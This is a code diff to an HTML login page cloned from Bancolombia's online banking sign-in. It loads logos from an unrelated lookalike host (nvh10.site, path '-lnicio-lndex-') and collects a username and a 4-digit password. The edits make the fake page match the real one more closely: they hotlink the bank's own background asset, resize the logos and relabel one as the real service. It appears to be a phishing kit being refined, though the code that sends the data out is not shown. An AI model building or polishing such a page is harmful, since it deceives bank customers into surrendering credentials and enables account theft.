@@ -62,16 +62,17 @@
     .bc-mt-3 { margin-top: 1rem; }
     .bc-mt-4 { margin-top: 1.5rem; }
 
-    /* ====== TRAZO / FONDO DECORATIVO ====== */
+    /* ====== TRAZO / FONDO DECORATIVO (Restaurado) ====== */
     .trazo {
-      background-image: url('https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/02/LOG-NVO.png');
+      background-image: url('https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg');
       background-repeat: no-repeat;
       background-position: center top;
-      background-size: 280px auto;
-      padding-top: 120px;
+      background-size: cover;
+      padding-top: 40px;
+      padding-bottom: 40px;
     }
     @media (max-width: 575px) {
-      .trazo { background-size: 220px auto; padding-top: 90px; }
+      .trazo { background-size: auto 100%; padding-top: 20px; }
     }
 
     /* ====== LOGOS BANCOLOMBIA ====== */
@@ -79,27 +80,21 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 8px;
-      margin-top: 24px;
-      margin-bottom: 8px;
+      gap: 10px;
+      margin-top: 20px;
+      margin-bottom: 20px;
     }
     .brand-logos .logo-nvo {
-      width: 220px;
+      width: 280px; /* Logo principal tamaño adecuado */
       height: auto;
     }
     .brand-logos .logo-mtp {
-      width: 140px;
+      width: 220px; /* Aumentado de tamaño */
       height: auto;
-    }
-    .brand-logos .logo-pir {
-      width: 160px;
-      height: auto;
-      margin-top: 12px;
     }
     @media (max-width: 575px) {
-      .brand-logos .logo-nvo { width: 180px; }
-      .brand-logos .logo-mtp { width: 110px; }
-      .brand-logos .logo-pir { width: 130px; }
+      .brand-logos .logo-nvo { width: 200px; }
+      .brand-logos .logo-mtp { width: 180px; }
     }
 
     /* ====== CARD PRINCIPAL ====== */
@@ -335,14 +330,6 @@
       margin: 12px 0 24px;
       color: #292929;
     }
-    .demo-message {
-      text-align: center;
-      font-size: clamp(16px,2.5vw,21px);
-      line-height: 1.55;
-      margin: 0 auto 28px;
-      max-width: 540px;
-      color: #343434;
-    }
     .demo-actions { display: flex; justify-content: center; gap: 16px; margin-top: 20px; }
     .demo-actions button { flex: 1; max-width: 250px; min-height: 58px; }
     .demo-note { font-size: 12px; color: #777; text-align: center; margin-top: 24px; }
@@ -394,7 +381,7 @@
     }
     .sms-wrap.error .bc-input { border-bottom-color: var(--bc-error); }
 
-    /* ====== Ocultar iconos en card auth (como en el original) ====== */
+    /* ====== Ocultar iconos en card auth ====== */
     .bc-card-auth-body .bc-icon { display: none; }
   </style>
 </head>
@@ -408,6 +395,7 @@
   </div>
 
   <main class="svp-main">
+    <!-- Se restaura la clase trazo para las rayas del fondo -->
     <div class="bc-container-fluid trazo">
 
       <!-- LOGOS BANCOLOMBIA -->
@@ -415,10 +403,10 @@
         <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/02/LOG-NVO.png"
              alt="Bancolombia" class="logo-nvo">
         <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/02/MTP.png"
-             alt="MTP" class="logo-mtp">
+             alt="Sucursal Virtual Personas" class="logo-mtp">
       </div>
 
-      <h1 class="bc-text-center bc-mt-4" style="font-family:'CIB Sans Light',Arial,sans-serif;font-weight:200;font-size:2.25rem;line-height:40px;color:#2c2a29;">Ingreso</h1>
+      <!-- Se eliminó el h1 de "Ingreso" -->
 
       <div class="bc-row bc-justify-content-center form-container">
         <div class="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
@@ -441,7 +429,7 @@
                       <input id="usuario" name="usuario" autocomplete="off" autocorrect="off"
                              spellcheck="false" maxlength="20"
                              aria-describedby="username-helper" aria-invalid="false"
-                             class="bc-input" placeholder=" " aria-label="Usuario" required>
+                             class="bc-input" placeholder="Usuario" aria-label="Usuario" required>
                       <label for="usuario"></label>
                       <span id="username-helper" class="authentication-form__help-text"></span>
                       <a href="#" class="bc-link link-underline">
@@ -456,7 +444,7 @@
                       <input id="clave" minlength="4" maxlength="4" type="password" name="clave"
                              autocomplete="off" inputmode="numeric"
                              aria-describedby="password-helper" aria-invalid="false"
-                             class="bc-input" placeholder=" " aria-label="Clave" required>
+                             class="bc-input" placeholder="Clave" aria-label="Clave" required>
                       <label for="clave"></label>
                       <span id="password-helper" class="authentication-form__help-text"></span>
                       <a href="#" class="bc-link link-underline">
@@ -858,7 +846,7 @@
     });
 
     // ==========================================
-    // RELOJ / FECHA (del archivo original)
+    // RELOJ / FECHA
     // ==========================================
     function actualizarFecha() {
       const ahora = new Date();
